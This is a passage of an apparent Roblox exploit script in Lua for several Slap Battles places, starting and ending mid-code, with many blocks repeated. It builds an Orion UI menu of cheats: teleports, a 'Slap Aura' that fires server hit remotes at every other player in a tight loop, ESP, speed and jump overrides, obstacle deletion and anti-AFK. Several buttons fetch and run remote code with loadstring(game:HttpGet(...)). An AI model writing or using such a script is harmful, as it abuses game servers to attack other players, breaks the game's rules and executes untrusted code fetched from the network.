        -- Set the HoldDuration of the ProximityPrompt to 0
        descendant.HoldDuration = 0
    end
end
task.wait(0.1)
end
	end    
})

-- Function to find all C4s in workspace
local function getAllC4s()
    local c4List = {}
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and obj.Name == "C4" then
            table.insert(c4List, obj)
        elseif obj:IsA("Model") and obj.Name == "C4" and obj.PrimaryPart then
            table.insert(c4List, obj.PrimaryPart)
        end
    end
    return c4List
end

-- Button functionality
Tab:AddButton({
    Name = "Teleport to Random C4",
    Callback = function()
        local c4s = getAllC4s()
        if #c4s == 0 then
            OrionLib:MakeNotification({
                Name = "No C4s Found",
                Content = "No C4 objects were found in the workspace.",
                Time = 3
            })
            return
        end

        local randomC4 = c4s[math.random(1, #c4s)]
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            character.HumanoidRootPart.CFrame = randomC4.CFrame + Vector3.new(0, 5, 0) -- Teleport slightly above the C4
        end
    end
})

Tab:AddToggle({
	Name = "Equip All C4's",
	Default = false,
	Callback = function(state)
		running = state

		-- Begin the sequence
		coroutine.wrap(function()
			if not running then return end

			-- Step 1: Find all C4 MeshParts in workspace
			local c4Parts = {}
			for _, obj in pairs(workspace:GetDescendants()) do
				if obj:IsA("MeshPart") and obj.Name == "C4" then
					table.insert(c4Parts, obj)
				end
			end

			-- Step 2: Teleport to each C4 and activate ProximityPrompt
			for _, c4 in ipairs(c4Parts) do
				if not running then return end
				humanoidRootPart.CFrame = c4.CFrame + Vector3.new(0, 3, 0) -- Slightly above it

				local prompt = c4:FindFirstChildOfClass("ProximityPrompt")
				if prompt then
					fireproximityprompt(prompt)
					collectedC4s += 1
					wait(0.5)
				end
			end

			-- Step 3: Wait for C4s to finish collecting (optional check)
			repeat wait() until collectedC4s >= 4 or not running

			if not running then return end

			-- Step 4: Equip all tools in Backpack that have "C4" in their name
			for _, tool in ipairs(player.Backpack:GetChildren()) do
				if tool:IsA("Tool") and string.find(tool.Name, "C4") then
					tool.Parent = character
					wait(0.2)
				end
			end

			-- Step 5: Find all MeshParts inside workspace.ExplosiveGhosts["1"]
			local ghostFolder = workspace:FindFirstChild("ExplosiveGhosts")
			if not ghostFolder then return end
			local innerFolder = ghostFolder:FindFirstChild("1")
			if not innerFolder then return end

			local ghostParts = {}
			for _, obj in pairs(innerFolder:GetDescendants()) do
				if obj:IsA("MeshPart") then
					table.insert(ghostParts, obj)
				end
			end

			-- Step 6: Teleport to each ghost and activate ProximityPrompt
			for _, part in ipairs(ghostParts) do
				if not running then return end
				humanoidRootPart.CFrame = part.CFrame + Vector3.new(0, 3, 0)

				local prompt = part:FindFirstChildOfClass("ProximityPrompt")
				if prompt then
					fireproximityprompt(prompt)
					wait(0.5)
				end
			end

			-- Step 7: Stop the toggle
			running = false
			OrionLib:MakeNotification({
				Name = "C4 Sequence Complete",
				Content = "All C4s collected and used!",
				Time = 5
			})
		end)()
	end
})

Tab:AddButton({
	Name = "Create/Remove Safe Spot",
	Callback = function()
--ANTI VOID--
if workspace:FindFirstChild("AntiVoid") == nil then
--ANTI VOID--
local Safespot = Instance.new("Part",workspace)
Safespot.Name = "AntiVoid"
Safespot.Position = Vector3.new(4865, 5592, -336)
Safespot.Size = Vector3.new(1000000, 1, 1000000)
Safespot.Anchored = true
Safespot.CanCollide = true
Safespot.Transparency = .5
--ANTI VOID--
OrionLib:MakeNotification({Name = "Success",Content = "Created Successfully!",Image = "rbxassetid://7733715400",Time = 3})
else
game.workspace.AntiVoid:Destroy()
OrionLib:MakeNotification({Name = "Success",Content = "Removed Successfully!",Image = "rbxassetid://7733715400",Time = 3})
end
end
})

    Tab:AddButton({
        Name = "Teleport To Safe Spot",
        Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4869, 5595, -342)
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

    local Tab = Window:MakeTab({
        Name = "Main-Mortis",
        Icon = "rbxassetid://7734053426",
        PremiumOnly = false
    })

    Section = Tab:AddSection({
        Name = "1-3 Stage"
    })

    Tab:AddButton({
        Name = "Teleport To ??? (Hardmode) Door",
        Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-453, 8, -83)
        end
    })

    Tab:AddButton({
        Name = "Teleport To Cursed Dice",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(5018, 5659, -482)
        end
    })

    Tab:AddButton({
        Name = "Teleport To Boss Fight",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4893, 5549, -361)
        end
    })

    Section = Tab:AddSection({
        Name = "Boss Stage"
    })

Tab:AddButton({
	Name = "Escape Rope (Jumps 5 Times)",
	Callback = function()
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local humanoid = character:WaitForChild("Humanoid")

		for i = 1, 5 do
			humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
			wait(0.1) -- delay between jumps
		end
	end    
})

Tab:AddButton({
	Name = "Auto Set Proximity Prompt (0 Sec CD)",
	Callback = function()
while true do
-- Loop through all descendants of the workspace
for _, descendant in pairs(workspace:GetDescendants()) do
    -- Check if the descendant is a ProximityPrompt
    if descendant:IsA("ProximityPrompt") then
        -- Set the HoldDuration of the ProximityPrompt to 0
        descendant.HoldDuration = 0
    end
end
task.wait(0.1)
end
	end    
})

-- Function to find all C4s in workspace
local function getAllC4s()
    local c4List = {}
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and obj.Name == "C4" then
            table.insert(c4List, obj)
        elseif obj:IsA("Model") and obj.Name == "C4" and obj.PrimaryPart then
            table.insert(c4List, obj.PrimaryPart)
        end
    end
    return c4List
end

-- Button functionality
Tab:AddButton({
    Name = "Teleport to Random C4",
    Callback = function()
        local c4s = getAllC4s()
        if #c4s == 0 then
            OrionLib:MakeNotification({
                Name = "No C4s Found",
                Content = "No C4 objects were found in the workspace.",
                Time = 3
            })
            return
        end

        local randomC4 = c4s[math.random(1, #c4s)]
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            character.HumanoidRootPart.CFrame = randomC4.CFrame + Vector3.new(0, 5, 0) -- Teleport slightly above the C4
        end
    end
})

Tab:AddToggle({
	Name = "Equip All C4's",
	Default = false,
	Callback = function(state)
		running = state

		-- Begin the sequence
		coroutine.wrap(function()
			if not running then return end

			-- Step 1: Find all C4 MeshParts in workspace
			local c4Parts = {}
			for _, obj in pairs(workspace:GetDescendants()) do
				if obj:IsA("MeshPart") and obj.Name == "C4" then
					table.insert(c4Parts, obj)
				end
			end

			-- Step 2: Teleport to each C4 and activate ProximityPrompt
			for _, c4 in ipairs(c4Parts) do
				if not running then return end
				humanoidRootPart.CFrame = c4.CFrame + Vector3.new(0, 3, 0) -- Slightly above it

				local prompt = c4:FindFirstChildOfClass("ProximityPrompt")
				if prompt then
					fireproximityprompt(prompt)
					collectedC4s += 1
					wait(0.5)
				end
			end

			-- Step 3: Wait for C4s to finish collecting (optional check)
			repeat wait() until collectedC4s >= 4 or not running

			if not running then return end

			-- Step 4: Equip all tools in Backpack that have "C4" in their name
			for _, tool in ipairs(player.Backpack:GetChildren()) do
				if tool:IsA("Tool") and string.find(tool.Name, "C4") then
					tool.Parent = character
					wait(0.2)
				end
			end

			-- Step 5: Find all MeshParts inside workspace.ExplosiveGhosts["1"]
			local ghostFolder = workspace:FindFirstChild("ExplosiveGhosts")
			if not ghostFolder then return end
			local innerFolder = ghostFolder:FindFirstChild("1")
			if not innerFolder then return end

			local ghostParts = {}
			for _, obj in pairs(innerFolder:GetDescendants()) do
				if obj:IsA("MeshPart") then
					table.insert(ghostParts, obj)
				end
			end

			-- Step 6: Teleport to each ghost and activate ProximityPrompt
			for _, part in ipairs(ghostParts) do
				if not running then return end
				humanoidRootPart.CFrame = part.CFrame + Vector3.new(0, 3, 0)

				local prompt = part:FindFirstChildOfClass("ProximityPrompt")
				if prompt then
					fireproximityprompt(prompt)
					wait(0.5)
				end
			end

			-- Step 7: Stop the toggle
			running = false
			OrionLib:MakeNotification({
				Name = "C4 Sequence Complete",
				Content = "All C4s collected and used!",
				Time = 5
			})
		end)()
	end
})

Tab:AddButton({
	Name = "Create/Remove Safe Spot",
	Callback = function()
--ANTI VOID--
if workspace:FindFirstChild("AntiVoid") == nil then
--ANTI VOID--
local Safespot = Instance.new("Part",workspace)
Safespot.Name = "AntiVoid"
Safespot.Position = Vector3.new(4865, 5592, -336)
Safespot.Size = Vector3.new(1000000, 1, 1000000)
Safespot.Anchored = true
Safespot.CanCollide = true
Safespot.Transparency = .5
--ANTI VOID--
OrionLib:MakeNotification({Name = "Success",Content = "Created Successfully!",Image = "rbxassetid://7733715400",Time = 3})
else
game.workspace.AntiVoid:Destroy()
OrionLib:MakeNotification({Name = "Success",Content = "Removed Successfully!",Image = "rbxassetid://7733715400",Time = 3})
end
end
})

    Tab:AddButton({
        Name = "Teleport To Safe Spot",
        Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4869, 5595, -342)
        end
    })

        local Tab = Window:MakeTab({
        Name = "Others",
        Icon = "rbxassetid://7734053426",
        PremiumOnly = false
    })

    Section = Tab:AddSection({
        Name = "Other Things"
    })

    Tab:AddButton({
        Name = "Teleport To barzil (1)",
        Callback = function()
game:GetService("TeleportService"):Teleport(7234087065)
        end
    })

        Tab:AddButton({
        Name = "Teleport To barzil (2)",
        Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.portal.CFrame
        end
    })

        Tab:AddButton({
        Name = "Teleport To Slap Battles",
        Callback = function()
game:GetService("TeleportService"):Teleport(6403373529)
        end
    })

    Tab:AddToggle({
        Name = "Full Bright",
        Default = false,
        Callback = function(Value)
            local Lighting = game:GetService("Lighting")
            if Value then
                Lighting.Brightness = 10
                Lighting.ClockTime = 12
                Lighting.FogEnd = 10000
                Lighting.GlobalShadows = true
                Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
            else
                Lighting.Brightness = 2
                Lighting.ClockTime = 14
                Lighting.FogEnd = 100000
                Lighting.GlobalShadows = false
                Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
            end
        end
    })

    Tab:AddButton({
        Name = "Infinite Yield",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end
    })

end

if game.PlaceId == 90553746175288 then -- SB TAKEOVER (Regular)
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

local Tab = Window:MakeTab({
    Name = "Info",
    Icon = "rbxassetid://7734053426",
    PremiumOnly = false
})

Section = Tab:AddSection({
    Name = "Timer"
})

CheckTimer = Tab:AddLabel("Check Timer:[ "..game:GetService("Players").LocalPlayer.PlayerGui.topbar_timer.Frame.timer.TextLabel.Text.." ]")

Section = Tab:AddSection({
    Name = "Teams"
})

CheckTeamMagenta = Tab:AddLabel("Check Team Magenta: ["..game:GetService("Players").LocalPlayer.PlayerGui.team_paint.Frame.paint.teams.magenta.TextLabel.Text.." ]")

CheckTeamGreen = Tab:AddLabel("Check Team Green: [ "..game:GetService("Players").LocalPlayer.PlayerGui.team_paint.Frame.paint.teams.green.TextLabel.Text.." ]")

CheckTeamCyan = Tab:AddLabel("Check Team Cyan: [ "..game:GetService("Players").LocalPlayer.PlayerGui.team_paint.Frame.paint.teams.cyan.TextLabel.Text.." ]")

Section = Tab:AddSection({
    Name = "Auto Info"
})

local AutoSetInfoServer
AutoSetInfo = Tab:AddToggle({
	Name = "Auto Set Info",
	Default = false,
	Callback = function(Value)
_G.AutoSetInfo = Value
AutoSetInfoServer = game:GetService("RunService").RenderStepped:Connect(function()
if _G.AutoSetInfo == true then

CheckTimer:Set("Check Timer:[ "..game:GetService("Players").LocalPlayer.PlayerGui.topbar_timer.Frame.timer.TextLabel.Text.." ]")

CheckTeamMagenta:Set("Check Team Magenta: ["..game:GetService("Players").LocalPlayer.PlayerGui.team_paint.Frame.paint.teams.magenta.TextLabel.Text.." ]")

CheckTeamGreen:Set("Check Team Green: [ "..game:GetService("Players").LocalPlayer.PlayerGui.team_paint.Frame.paint.teams.green.TextLabel.Text.." ]")

CheckTeamCyan:Set("Check Team Cyan: [ "..game:GetService("Players").LocalPlayer.PlayerGui.team_paint.Frame.paint.teams.cyan.TextLabel.Text.." ]")

    elseif _G.AutoSetInfo == false then
	    if AutoSetInfoServer then
		    AutoSetInfoServer:Disconnect()
		        AutoSetInfoServer = nil
	end
end
end)
	end    
})

local Tab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://7733960981",
    PremiumOnly = false
})

Section = Tab:AddSection({
    Name = "Slap Aura + Auto R Ability Use"
})

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local SlapAuraEnabled = false

Tab:AddToggle({
    Name = "Slap Aura",
    Default = false,
    Callback = function(Value)
        SlapAuraEnabled = Value

        if SlapAuraEnabled then
            task.spawn(function()
                while SlapAuraEnabled do
                    for _, player in pairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Torso") then
                            local args = {
                                "slap",
                                {
                                    Instance = player.Character:FindFirstChild("Torso")
                                }
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("tool"):WaitForChild("hit"):FireServer(unpack(args))
                        end
                    end
                    task.wait(0.01)
                end
            end)
        end
    end
})

local args = {
	"slap",
	{
		Instance = workspace:WaitForChild("npc"):WaitForChild("Torso")
	}
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("tool"):WaitForChild("hit"):FireServer(unpack(args))


local AutoUseEnabled = false

Tab:AddToggle({
    Name = "Auto Use Ability",
    Default = false,
    Callback = function(Value)
        AutoUseEnabled = Value

        if AutoUseEnabled then
            task.spawn(function()
                while AutoUseEnabled do
                    local args = {
                        "R"
                    }
                    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("tool"):WaitForChild("use"):FireServer(unpack(args))
                    task.wait(0.01)
                end
            end)
        end
    end
})

Section = Tab:AddSection({
    Name = "ESP Feature"
})

Tab:AddToggle({
    Name = "Bots/NPCs ESP",
    Default = false,
    Callback = function(Value)
        BotsESPEnabled = Value

        -- Remove existing ESPs if toggle is turned off
        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "BotsESP" then
                    v:Destroy()
                end
            end
            return
        end

        -- ESP loop
        task.spawn(function()
            while BotsESPEnabled do
                local player = game.Players.LocalPlayer
                local char = player.Character or player.CharacterAdded:Wait()
                local hrp = char and char:FindFirstChild("HumanoidRootPart")

                if hrp then
                    -- Find all NPC models named "npc" in workspace
                    for _, npcModel in pairs(workspace:GetDescendants()) do
                        if npcModel.Name == "npc" and npcModel:IsA("Model") then
                            local npcPart = npcModel:FindFirstChild("HumanoidRootPart") or npcModel:FindFirstChildWhichIsA("BasePart")

                            if npcPart then
                                local gui = npcPart:FindFirstChild("BotsESP")

                                -- Create ESP if not present
                                if not gui then
                                    gui = Instance.new("BillboardGui")
                                    gui.Name = "BotsESP"
                                    gui.Adornee = npcPart
                                    gui.Size = UDim2.new(0, 150, 0, 40)
                                    gui.StudsOffset = Vector3.new(0, 2.5, 0)
                                    gui.AlwaysOnTop = true
                                    gui.Parent = npcPart

                                    local label = Instance.new("TextLabel", gui)
                                    label.Name = "Label"
                                    label.BackgroundTransparency = 1
                                    label.Size = UDim2.new(1, 0, 1, 0)
                                    label.TextSize = 16
                                    label.Font = Enum.Font.FredokaOne
                                    label.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red
                                    label.TextStrokeTransparency = 0.2
                                    label.Text = "Bot"
                                end

                                -- Update distance
                                local label = gui:FindFirstChild("Label")
                                if label then
                                    local dist = math.floor((npcPart.Position - hrp.Position).Magnitude)
                                    label.Text = "Bot | " .. dist .. "m"
                                end
                            end
                        end
                    end
                end

                task.wait(0.5)
            end
        end)
    end
})

Section = Tab:AddSection({
    Name = "WalkSpeed/Jumppower"
})

local Walkspeed = 20
local KeepWalkspeed = false

Tab:AddSlider({
    Name = "WalkSpeed",
    Min = 0,
    Max = 100,
    Default = Walkspeed,
    Color = Color3.fromRGB(0, 0, 255),
    Increment = 1,
    ValueName = "WalkSpeed",
    Callback = function(Value)
        Walkspeed = Value
        local char = game.Players.LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.WalkSpeed = Value
        end
    end
})

Tab:AddToggle({
    Name = "Walkspeed Auto Change",
    Default = false,
    Callback = function(Value)
        KeepWalkspeed = Value
        while KeepWalkspeed do
            local char = game.Players.LocalPlayer.Character
            if char and char:FindFirstChild("Humanoid") and char.Humanoid.WalkSpeed ~= Walkspeed then
                char.Humanoid.WalkSpeed = Walkspeed
            end
            task.wait()
        end
    end
})

local Jumppower = 50
local KeepJumppower = false

Tab:AddSlider({
    Name = "JumpPower",
    Min = 0,
    Max = 100,
    Default = Jumppower,
    Color = Color3.fromRGB(0, 0, 255),
    Increment = 1,
    ValueName = "JumpPower",
    Callback = function(Value)
        Jumppower = Value
        local char = game.Players.LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.JumpPower = Value
        end
    end
})

Tab:AddToggle({
    Name = "Jumppower Set Auto",
    Default = false,
    Callback = function(Value)
        KeepJumppower = Value
        while KeepJumppower do
            local char = game.Players.LocalPlayer.Character
            if char and char:FindFirstChild("Humanoid") and char.Humanoid.JumpPower ~= Jumppower then
                char.Humanoid.JumpPower = Jumppower
            end
            task.wait()
        end
    end
})


Section = Tab:AddSection({
    Name = "Others"
})

Tab:AddDropdown({
	Name = "Round Results Gui",
	Default = "Show",
	Options = {"Show", "Hide"},
	Callback = function(Value)
RoundResultsGui = Value
	end    
})

    Tab:AddButton({
        Name = "Show/Hide Round Results (So Wont Get Stuck)",
        Callback = function()
            if RoundResultsGui == "Show" then
                game:GetService("Players").LocalPlayer.PlayerGui.round_results.Enabled = true
            elseif RoundResultsGui == "Hide" then
                game:GetService("Players").LocalPlayer.PlayerGui.round_results.Enabled = false
            end
        end
    })

    Tab:AddButton({
        Name = "Infinite Yield",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 84245222894009 then -- SB TAKEOVER (Championship)
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

local Tab = Window:MakeTab({
    Name = "Info",
    Icon = "rbxassetid://7734053426",
    PremiumOnly = false
})

Section = Tab:AddSection({
    Name = "Timer"
})

CheckTimer = Tab:AddLabel("Check Timer:[ "..game:GetService("Players").LocalPlayer.PlayerGui.topbar_timer.Frame.timer.TextLabel.Text.." ]")

Section = Tab:AddSection({
    Name = "Teams"
})

CheckTeamMagenta = Tab:AddLabel("Check Team Magenta: ["..game:GetService("Players").LocalPlayer.PlayerGui.team_paint.Frame.paint.teams.magenta.TextLabel.Text.." ]")

CheckTeamGreen = Tab:AddLabel("Check Team Green: [ "..game:GetService("Players").LocalPlayer.PlayerGui.team_paint.Frame.paint.teams.green.TextLabel.Text.." ]")

CheckTeamCyan = Tab:AddLabel("Check Team Cyan: [ "..game:GetService("Players").LocalPlayer.PlayerGui.team_paint.Frame.paint.teams.cyan.TextLabel.Text.." ]")

Section = Tab:AddSection({
    Name = "Auto Info"
})

local AutoSetInfoServer
AutoSetInfo = Tab:AddToggle({
	Name = "Auto Set Info",
	Default = false,
	Callback = function(Value)
_G.AutoSetInfo = Value
AutoSetInfoServer = game:GetService("RunService").RenderStepped:Connect(function()
if _G.AutoSetInfo == true then

CheckTimer:Set("Check Timer:[ "..game:GetService("Players").LocalPlayer.PlayerGui.topbar_timer.Frame.timer.TextLabel.Text.." ]")

CheckTeamMagenta:Set("Check Team Magenta: ["..game:GetService("Players").LocalPlayer.PlayerGui.team_paint.Frame.paint.teams.magenta.TextLabel.Text.." ]")

CheckTeamGreen:Set("Check Team Green: [ "..game:GetService("Players").LocalPlayer.PlayerGui.team_paint.Frame.paint.teams.green.TextLabel.Text.." ]")

CheckTeamCyan:Set("Check Team Cyan: [ "..game:GetService("Players").LocalPlayer.PlayerGui.team_paint.Frame.paint.teams.cyan.TextLabel.Text.." ]")

    elseif _G.AutoSetInfo == false then
	    if AutoSetInfoServer then
		    AutoSetInfoServer:Disconnect()
		        AutoSetInfoServer = nil
	end
end
end)
	end    
})

local Tab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://7733960981",
    PremiumOnly = false
})

Section = Tab:AddSection({
    Name = "Slap Aura + Auto R Ability Use"
})

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local SlapAuraEnabled = false

Tab:AddToggle({
    Name = "Slap Aura",
    Default = false,
    Callback = function(Value)
        SlapAuraEnabled = Value

        if SlapAuraEnabled then
            task.spawn(function()
                while SlapAuraEnabled do
                    for _, player in pairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Torso") then
                            local args = {
                                "slap",
                                {
                                    Instance = player.Character:FindFirstChild("Torso")
                                }
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("tool"):WaitForChild("hit"):FireServer(unpack(args))
                        end
                    end
                    task.wait(0.01)
                end
            end)
        end
    end
})

local args = {
	"slap",
	{
		Instance = workspace:WaitForChild("npc"):WaitForChild("Torso")
	}
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("tool"):WaitForChild("hit"):FireServer(unpack(args))


local AutoUseEnabled = false

Tab:AddToggle({
    Name = "Auto Use Ability",
    Default = false,
    Callback = function(Value)
        AutoUseEnabled = Value

        if AutoUseEnabled then
            task.spawn(function()
                while AutoUseEnabled do
                    local args = {
                        "R"
                    }
                    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("tool"):WaitForChild("use"):FireServer(unpack(args))
                    task.wait(0.01)
                end
            end)
        end
    end
})

Section = Tab:AddSection({
    Name = "ESP Feature"
})

Tab:AddToggle({
    Name = "Bots/NPCs ESP",
    Default = false,
    Callback = function(Value)
        BotsESPEnabled = Value

        -- Remove existing ESPs if toggle is turned off
        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "BotsESP" then
                    v:Destroy()
                end
            end
            return
        end

        -- ESP loop
        task.spawn(function()
            while BotsESPEnabled do
                local player = game.Players.LocalPlayer
                local char = player.Character or player.CharacterAdded:Wait()
                local hrp = char and char:FindFirstChild("HumanoidRootPart")

                if hrp then
                    -- Find all NPC models named "npc" in workspace
                    for _, npcModel in pairs(workspace:GetDescendants()) do
                        if npcModel.Name == "npc" and npcModel:IsA("Model") then
                            local npcPart = npcModel:FindFirstChild("HumanoidRootPart") or npcModel:FindFirstChildWhichIsA("BasePart")

                            if npcPart then
                                local gui = npcPart:FindFirstChild("BotsESP")

                                -- Create ESP if not present
                                if not gui then
                                    gui = Instance.new("BillboardGui")
                                    gui.Name = "BotsESP"
                                    gui.Adornee = npcPart
                                    gui.Size = UDim2.new(0, 150, 0, 40)
                                    gui.StudsOffset = Vector3.new(0, 2.5, 0)
                                    gui.AlwaysOnTop = true
                                    gui.Parent = npcPart

                                    local label = Instance.new("TextLabel", gui)
                                    label.Name = "Label"
                                    label.BackgroundTransparency = 1
                                    label.Size = UDim2.new(1, 0, 1, 0)
                                    label.TextSize = 16
                                    label.Font = Enum.Font.FredokaOne
                                    label.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red
                                    label.TextStrokeTransparency = 0.2
                                    label.Text = "Bot"
                                end

                                -- Update distance
                                local label = gui:FindFirstChild("Label")
                                if label then
                                    local dist = math.floor((npcPart.Position - hrp.Position).Magnitude)
                                    label.Text = "Bot | " .. dist .. "m"
                                end
                            end
                        end
                    end
                end

                task.wait(0.5)
            end
        end)
    end
})

Section = Tab:AddSection({
    Name = "WalkSpeed/Jumppower"
})

local Walkspeed = 20
local KeepWalkspeed = false

Tab:AddSlider({
    Name = "WalkSpeed",
    Min = 0,
    Max = 100,
    Default = Walkspeed,
    Color = Color3.fromRGB(0, 0, 255),
    Increment = 1,
    ValueName = "WalkSpeed",
    Callback = function(Value)
        Walkspeed = Value
        local char = game.Players.LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.WalkSpeed = Value
        end
    end
})

Tab:AddToggle({
    Name = "Walkspeed Auto Change",
    Default = false,
    Callback = function(Value)
        KeepWalkspeed = Value
        while KeepWalkspeed do
            local char = game.Players.LocalPlayer.Character
            if char and char:FindFirstChild("Humanoid") and char.Humanoid.WalkSpeed ~= Walkspeed then
                char.Humanoid.WalkSpeed = Walkspeed
            end
            task.wait()
        end
    end
})

local Jumppower = 50
local KeepJumppower = false

Tab:AddSlider({
    Name = "JumpPower",
    Min = 0,
    Max = 100,
    Default = Jumppower,
    Color = Color3.fromRGB(0, 0, 255),
    Increment = 1,
    ValueName = "JumpPower",
    Callback = function(Value)
        Jumppower = Value
        local char = game.Players.LocalPlayer.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.JumpPower = Value
        end
    end
})

Tab:AddToggle({
    Name = "Jumppower Set Auto",
    Default = false,
    Callback = function(Value)
        KeepJumppower = Value
        while KeepJumppower do
            local char = game.Players.LocalPlayer.Character
            if char and char:FindFirstChild("Humanoid") and char.Humanoid.JumpPower ~= Jumppower then
                char.Humanoid.JumpPower = Jumppower
            end
            task.wait()
        end
    end
})

Section = Tab:AddSection({
    Name = "Others"
})

Tab:AddDropdown({
	Name = "Round Results Gui",
	Default = "Show",
	Options = {"Show", "Hide"},
	Callback = function(Value)
RoundResultsGui = Value
	end    
})

    Tab:AddButton({
        Name = "Show/Hide Round Results (So Wont Get Stuck)",
        Callback = function()
            if RoundResultsGui == "Show" then
                game:GetService("Players").LocalPlayer.PlayerGui.round_results.Enabled = true
            elseif RoundResultsGui == "Hide" then
                game:GetService("Players").LocalPlayer.PlayerGui.round_results.Enabled = false
            end
        end
    })

    Tab:AddButton({
        Name = "Infinite Yield",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 106620300132058 then -- Plate glove obtainment
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

local Tab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://7733960981",
    PremiumOnly = false
})

    Tab:AddButton({
        Name = "Auto Remove Wall/Lava",
        Callback = function()
workspace.Obstacles:destroy()
        end
    })

AntiAfk = Tab:AddToggle({
	Name = "Anti Afk",
	Default = false,
	Callback = function(Value)
	_G.AntiAfk = Value
local VirtualUser = game:GetService('VirtualUser')

game:GetService('Players').LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)
	end    
})

    Tab:AddButton({
        Name = "Touch Glove (Make Sure Its Spawned)",
        Callback = function()
if workspace["Glove Model"].Hand.Transparency == 0 then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace["Glove Model"].CFrame
else
OrionLib:MakeNotification({Name = "Error",Content = "Wait For Glove To Spawn First",Image = "rbxassetid://7743878857",Time = 3})
end
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 103505724406848 then -- Zombies
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

local Tab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://7733960981",
    PremiumOnly = false
})

Tab:AddButton({
    Name = "Slap Aura Enemies (No Loop)",
    Callback = function()
        local enemiesFolder = workspace:WaitForChild("Enemies")
        local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("GeneralHit")
        
        -- Loop through all models in Enemies folder
        for _, model in pairs(enemiesFolder:GetChildren()) do
            if model:IsA("Model") then
                -- Try to find a valid part to target (Torso, HumanoidRootPart, Head, or any BasePart)
                local targetPart = model:FindFirstChild("Torso") or 
                                 model:FindFirstChild("HumanoidRootPart") or 
                                 model:FindFirstChild("Head") or
                                 model:FindFirstChildWhichIsA("BasePart")
                
                if targetPart then
                    local args = { targetPart }
                    remote:FireServer(unpack(args))
                end
            end
        end
    end
})

-- ========== Helper: Create Billboard ESP ==========
local function createESP(parent, name, text, color)
    local esp = Instance.new("BillboardGui", parent)
    esp.Name = name
    esp.Adornee = parent
    esp.Size = UDim2.new(0, 150, 0, 40)
    esp.StudsOffset = Vector3.new(0, 2, 0)
    esp.AlwaysOnTop = true

    local label = Instance.new("TextLabel", esp)
    label.BackgroundTransparency = 1
    label.Size = UDim2.new(1, 0, 1, 0)
